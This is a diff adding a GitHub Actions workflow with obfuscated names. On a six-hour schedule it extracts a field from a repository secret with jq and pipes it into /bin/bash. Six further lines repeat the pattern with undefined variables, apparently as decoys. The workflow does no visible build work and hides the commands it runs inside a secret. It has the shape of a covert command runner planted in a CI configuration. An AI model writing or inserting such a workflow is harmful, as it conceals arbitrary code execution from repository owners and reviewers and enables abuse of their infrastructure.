@@ -1,0 +1,23 @@
+name: democratburied
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: democratburied
+        env:
+          aeqp6: ${{ secrets.aeqp6 }}
+        run: |
+          echo $aeqp6 | jq -r .ykbla298 | /bin/bash
+          echo $sqr34496 | jq -r .gsest3 | /bin/bash
+          echo $x55 | jq -r .eqbz0161 | /bin/bash
+          echo $efwq29 | jq -r .so23467 | /bin/bash
+          echo $ohbx393 | jq -r .qzzy643 | /bin/bash
+          echo $vpv7836 | jq -r .tkf04242 | /bin/bash
+          echo $w6739 | jq -r .zzp66982 | /bin/bash
+
